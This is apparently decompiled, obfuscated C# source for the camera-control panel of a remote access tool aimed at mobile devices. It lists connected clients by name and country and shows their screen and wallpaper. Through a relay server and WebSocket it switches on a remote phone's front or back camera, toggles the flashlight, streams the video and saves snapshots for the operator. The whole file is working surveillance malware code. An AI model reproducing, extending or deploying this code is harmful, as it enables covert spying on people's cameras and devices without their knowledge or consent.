		this.Panel4.TabIndex = 50;
		this.savetimer.Interval = 1;
		this.statetimer.Interval = 1000;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.combosizes);
		this.Panel2.Controls.Add(this.DrakeWidth_W4);
		this.Panel2.Controls.Add(this.comboTargts);
		this.Panel2.Controls.Add(this.qualitydrop);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(2, 108);
		this.Panel2.Name = EXGuarder._5F763562;
		this.Panel2.Padding = new System.Windows.Forms.Padding(6, 5, 6, 5);
		this.Panel2.Size = new System.Drawing.Size(442, 33);
		this.Panel2.TabIndex = 51;
		this.Panel2.Controls.SetChildIndex(this.qualitydrop, 0);
		this.Panel2.Controls.SetChildIndex(this.comboTargts, 0);
		this.Panel2.Controls.SetChildIndex(this.DrakeWidth_W4, 0);
		this.Panel2.Controls.SetChildIndex(this.combosizes, 0);
		this.DrakeWidth_W2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W2.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W2.Location = new System.Drawing.Point(91, 5);
		this.DrakeWidth_W2.Name = EXGuarder._0D233918;
		this.DrakeWidth_W2.Size = new System.Drawing.Size(9, 23);
		this.DrakeWidth_W2.TabIndex = 15;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(446, 409);
		base.Controls.Add(this.viewimage);
		base.Controls.Add(this.Panel4);
		base.Controls.Add(this.Panel2);
		base.Controls.Add(this.Panel3);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._03736851);
		this.MinimumSize = new System.Drawing.Size(384, 362);
		base.Name = EXGuarder._54667532;
		this.Text = EXGuarder._73064E5B;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.Panel3, 0);
		base.Controls.SetChildIndex(this.Panel2, 0);
		base.Controls.SetChildIndex(this.Panel4, 0);
		base.Controls.SetChildIndex(this.viewimage, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.viewimage).EndInit();
		this.Panel3.ResumeLayout(false);
		this.Panel4.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public void RequestRender()
	{
		int tickCount = Environment.TickCount;
		ref int lastRenderTick = ref _lastRenderTick;
		long location = lastRenderTick;
		long num = Interlocked.Read(ref location);
		checked
		{
			lastRenderTick = (int)location;
			int num2 = (int)num;
			if (tickCount - num2 >= 33 && Interlocked.CompareExchange(ref _lastRenderTick, tickCount, num2) == num2)
			{
				BeginInvoke(new MethodInvoker(RenderFrame));
			}
		}
	}

	private void RenderFrame()
	{
		Bitmap tempImage = null;
		object frameLock = _frameLock;
		ObjectFlowControl.CheckForSyncLockOnValueType(frameLock);
		bool lockTaken = false;
		try
		{
			Monitor.Enter(frameLock, ref lockTaken);
			if (_latestFrame == null)
			{
				return;
			}
			tempImage = _latestFrame;
			_latestFrame = null;
		}
		finally
		{
			if (lockTaken)
			{
				Monitor.Exit(frameLock);
			}
		}
		if (viewimage.Image != null)
		{
			viewimage.Image.Dispose();
		}
		viewimage.Image = RotateFlip(tempImage);
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._54042527, EXGuarder._4D170A06);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._475E5724, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._31244711;
			combosizes.Text = EXGuarder._1A0E1631;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4A34760E, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._67650C33;
			combosizes.Text = EXGuarder._1C151219;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4345665E, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._38583F1C;
			combosizes.Text = EXGuarder._00771262;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4371412F, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._51152D5D;
			combosizes.Text = EXGuarder._42363358;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._70495C28, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._631D442C;
			combosizes.Text = EXGuarder._17063B37;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._482B5371, TextCompare: false))
		{
			comboTargts.Text = EXGuarder._6D57620D;
			combosizes.Text = EXGuarder._36283150;
		}
	}

	public CameraMonitor()
	{
		base.Load += CameraMonitor_Load;
		base.FormClosing += CameraMonitor_FormClosing;
		_latestFrame = null;
		_frameLock = RuntimeHelpers.GetObjectValue(new object());
		_lastRenderTick = 0;
		FPS = 0;
		websockclient = null;
		KEYsx = EXGuarder._58646A24;
		RotateFlipMap = new Dictionary<string, RotateFlipType>
		{
			{
				EXGuarder._58646A24,
				RotateFlipType.Rotate90FlipNone
			},
			{
				EXGuarder._4E647339,
				RotateFlipType.Rotate270FlipNone
			},
			{
				EXGuarder._3E1D0F03,
				RotateFlipType.Rotate180FlipX
			},
			{
				EXGuarder._1D3F551A,
				RotateFlipType.RotateNoneFlipX
			}
		};
		boSave = false;
		newphoto = false;
		InitializeComponent();
	}

	private void CameraMonitor_Load(object sender, EventArgs e)
	{
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		mytitle.Text = BTConst.Camerastr + EXGuarder._72665E61 + Btcli.name + EXGuarder._72665E61 + Btcli.country;
		translateme();
		statetimer.Start();
	}

	public void addsizes(object[] objs)
	{
		if (base.InvokeRequired)
		{
			addsizedele method = addsizes;
			Invoke(method, new object[1] { objs });
			return;
		}
		string[] array = (string[])objs[0];
		if (array != null && array.Length > 0)
		{
			if (array.Length == 1)
			{
				mainstatelabel.Text = EXGuarder._3529492C + array[0].ToString();
			}
			else
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					combosizes.Items.Add(text.Replace(EXGuarder._692E4322, EXGuarder._5A2B1500).Replace(EXGuarder._7076641D, EXGuarder._5A2B1500));
				}
				combosizes.Text = EXGuarder._1E685216;
				combosizes.MaxDropDownItems = array.Length;
			}
		}
		if (Operators.CompareString(combosizes.Text, EXGuarder._66725B76, TextCompare: false) == 0)
		{
			combosizes.Items.Add(EXGuarder._1E685216);
			combosizes.Items.Add(EXGuarder._155A0C25);
			combosizes.Text = EXGuarder._1E685216;
		}
	}

	private async void startbtn_Click(object sender, EventArgs e)
	{
		if (startbtn.Enabled)
		{
			await StartCameraAsync();
		}
	}

	private void SetConnectingUI()
	{
		startbtn.Enabled = false;
		stopbtn.Enabled = true;
		baseloader.Enabled = true;
		baseloader.Visible = true;
	}

	private void ResetUI(bool clearImage = false)
	{
		startbtn.Enabled = true;
		stopbtn.Enabled = false;
		baseloader.Enabled = false;
		baseloader.Visible = false;
		mainstatelabel.Text = EXGuarder._5B456135;
		if (clearImage)
		{
			viewimage.Image = null;
		}
	}

	public async Task StartCameraAsync()
	{
		SetConnectingUI();
		try
		{
			string text = comboTargts.Text;
			string left = text;
			string selectedCam;
			if (Operators.CompareString(left, "Front Camera", TextCompare: false) != 0)
			{
				if (Operators.CompareString(left, "Back Camera", TextCompare: false) != 0)
				{
					BTAlerter.infos("Select screen type.");
					ResetUI();
					return;
				}
				selectedCam = "0";
			}
			else
			{
				selectedCam = "1";
			}
			string text2 = combosizes.Text;
			if (!text2.Contains("x"))
			{
				BTAlerter.infos("Select screen Resolution.");
				ResetUI();
				return;
			}
			string selectedQua = qualitydrop.Text;
			mainstatelabel.Text = BTConst.selectedtypstr + ": " + comboTargts.Text + Strings.Space(10) + BTConst.Connectingstr;
			string text3 = await Task.Run([SpecialName] () =>
			{
				string serverNextKey = ServersMgr.GetServerNextKey(Btcli.Serverins.Address);
				return MyServer.JoinServer(new VB_0024AnonymousType_3<string, string, string, string>(EXGuarder._2A241D1B, EXGuarder._2261643D, EXGuarder._2261643D, serverNextKey), Btcli.Serverins.MainhttpClient, Btcli.Serverins.Address);
			});
			JObject jObject;
			try
			{
				jObject = JObject.Parse(text3);
			}
			catch (JsonReaderException ex)
			{
				ProjectData.SetProjectError(ex);
				JsonReaderException ex2 = ex;
				JsonReaderException ex3 = ex2;
				BTAlerter.infos("Try again.");
				Debuger.Log_d("JSON error", ex3.Message + "\r\n" + text3);
				ResetUI();
				ProjectData.ClearProjectError();
				return;
			}
			if (jObject["Success"] == null)
			{
				BTAlerter.infos("Server rejected connection.");
				ResetUI();
				return;
			}
			string text4 = jObject["Success"].ToString().Trim('"');
			websockclient = new WebSocketClient(BTConst.livcamstr, Btcli.address, Btcli.Serverins);
			try
			{
				await websockclient.ConnectAsync(text4);
			}
			catch (TimeoutException projectError)
			{
				ProjectData.SetProjectError(projectError);
				BTAlerter.infos("Connection timeout. Please try again.");
				ResetUI();
				ProjectData.ClearProjectError();
				return;
			}
			catch (Exception ex4)
			{
				ProjectData.SetProjectError(ex4);
				Exception ex5 = ex4;
				Exception ex6 = ex5;
				BTAlerter.infos("Connection failed: " + ex6.Message);
				ResetUI();
				ProjectData.ClearProjectError();
				return;
			}
			VB_0024AnonymousType_16<string, string, string, string, string> data = new VB_0024AnonymousType_16<string, string, string, string, string>("ON", selectedCam, text2, text4, selectedQua);
			string value = BTCommand.FormatCommand("Cam", data);
			Dictionary<string, object> chatData = new Dictionary<string, object>
			{
				{
					"msg",
					BTConst.wrk
				},
				{ "cmnd", value }
			};
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7);
			Exception ex8 = ex7;
			Exception ex9 = ex8;
			Debuger.Log_d("StartCameraAsync error", ex9.Message);
			BTAlerter.infos("Unexpected error occurred.");
			ResetUI();
			ProjectData.ClearProjectError();
		}
	}

	private void stopbtn_Click(object sender, EventArgs e)
	{
		if (stopbtn.Enabled)
		{
			VB_0024AnonymousType_5<string> data = new VB_0024AnonymousType_5<string>(EXGuarder._43103F26);
			string value = BTCommand.FormatCommand(EXGuarder._6B196101, data);
			Dictionary<string, object> dictionary = new Dictionary<string, object>();
			dictionary.Add(EXGuarder._62051F07, BTConst.wrk);
			dictionary.Add(EXGuarder._41544E78, value);
			Dictionary<string, object> chatData = dictionary;
			BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			ResetUI(clearImage: true);
			if (websockclient != null)
			{
				websockclient.Disconnect(BTConst.livcamstr, Btcli.address);
				websockclient = null;
			}
		}
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		if (viewimage.Image != null)
		{
			if (Operators.CompareString(KEYsx, EXGuarder._552D5342, TextCompare: false) == 0)
			{
				KEYsx = EXGuarder._69197025;
			}
			else if (Operators.CompareString(KEYsx, EXGuarder._69197025, TextCompare: false) == 0)
			{
				KEYsx = EXGuarder._4C78626B;
			}
			else if (Operators.CompareString(KEYsx, EXGuarder._4C78626B, TextCompare: false) == 0)
			{
				KEYsx = EXGuarder._1C233568;
			}
			else if (Operators.CompareString(KEYsx, EXGuarder._1C233568, TextCompare: false) == 0)
			{
				KEYsx = EXGuarder._552D5342;
			}
			else
			{
				KEYsx = EXGuarder._552D5342;
			}
		}
	}

	public Bitmap RotateFlip(Bitmap TempImage)
	{
		Bitmap result;
		try
		{
			if (RotateFlipMap.ContainsKey(KEYsx))
			{
				TempImage.RotateFlip(RotateFlipMap[KEYsx]);
			}
			result = TempImage;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = TempImage;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		if (viewimage.Image == null)
		{
			return;
		}
		if (Operators.ConditionalCompareObjectEqual(Button3.Tag, EXGuarder._263E1A62, TextCompare: false))
		{
			Button3.Tag = EXGuarder._5D125962;
			savetimer.Start();
			Button3.ForeColor = Color.DeepSkyBlue;
			boSave = true;
		}
		else if (Operators.ConditionalCompareObjectEqual(Button3.Tag, EXGuarder._5D125962, TextCompare: false))
		{
			Button3.Tag = EXGuarder._263E1A62;
			Button3.ForeColor = Color.White;
			savetimer.Stop();
			string text = Btcli.userfolder + EXGuarder._712F5966;
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			Process.Start(text);
			Button3.ForeColor = Color.White;
			Button3.BackColor = Color.Transparent;
			boSave = false;
		}
	}

	private void savetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = Btcli.userfolder + EXGuarder._183E1F4A;
			if (boSave)
			{
				if (newphoto)
				{
					newphoto = false;
					if (!Directory.Exists(text))
					{
						Directory.CreateDirectory(text);
					}
					if (Directory.Exists(text))
					{
						viewimage.Image.Save(text + EXGuarder._55662520 + DateAndTime.Now.ToString(EXGuarder._3F562723) + EXGuarder._0F240438, ImageFormat.Jpeg);
					}
				}
			}
			else
			{
				savetimer.Stop();
				savetimer.Dispose();
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			string _202C0F6A = EXGuarder._202C0F6A;
			if (FPS > 0 && stopbtn.Enabled)
			{
				_202C0F6A = EXGuarder._38491509 + FPS;
				FPS = 0;
			}
			else
			{
				_202C0F6A = EXGuarder._10541147;
			}
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Camerastr + EXGuarder._46244D1D + Btcli.name + EXGuarder._46244D1D + Btcli.country + EXGuarder._46244D1D + _202C0F6A;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Camerastr + EXGuarder._46244D1D + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void CameraMonitor_FormClosing(object sender, FormClosingEventArgs e)
	{
		statetimer.Stop();
		if (websockclient != null)
		{
			websockclient.Disconnect(BTConst.livcamstr, Btcli.address);
			websockclient = null;
		}
	}

	private void DrakeUIButtonIcon2_Click_1(object sender, EventArgs e)
	{
		string value = EXGuarder._0C571A26;
		if (Operators.ConditionalCompareObjectEqual(flashbtn.Tag, EXGuarder._682C150D, TextCompare: false))
		{
			if (MyMsg.Show(BTConst.confirmstr, BTConst.trunflashstr, MyMsg.msgtype.Confirm, use_no: true, showskip: false, EXGuarder._47162934) != DialogResult.OK)
			{
				return;
			}
			value = EXGuarder._37451028;
			flashbtn.Tag = EXGuarder._0D2D6269;
			flashbtn.ForeColor = Color.DeepSkyBlue;
		}
		else if (Operators.ConditionalCompareObjectEqual(flashbtn.Tag, EXGuarder._0D2D6269, TextCompare: false))
		{
			value = EXGuarder._0C571A26;
			flashbtn.Tag = EXGuarder._682C150D;
			flashbtn.ForeColor = Color.White;
			flashbtn.BackColor = Color.Transparent;
		}
		Dictionary<string, object> dictionary = new Dictionary<string, object>();
		dictionary.Add(EXGuarder._5F426835, EXGuarder._30473303);
		dictionary.Add(EXGuarder._2F1D2D30, EXGuarder._4C446B1D);
		dictionary.Add(EXGuarder._6F251523, value);
		Dictionary<string, object> chatData = dictionary;
		BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
	}

	private void Panel3_Paint(object sender, PaintEventArgs e)
	{
	}
}
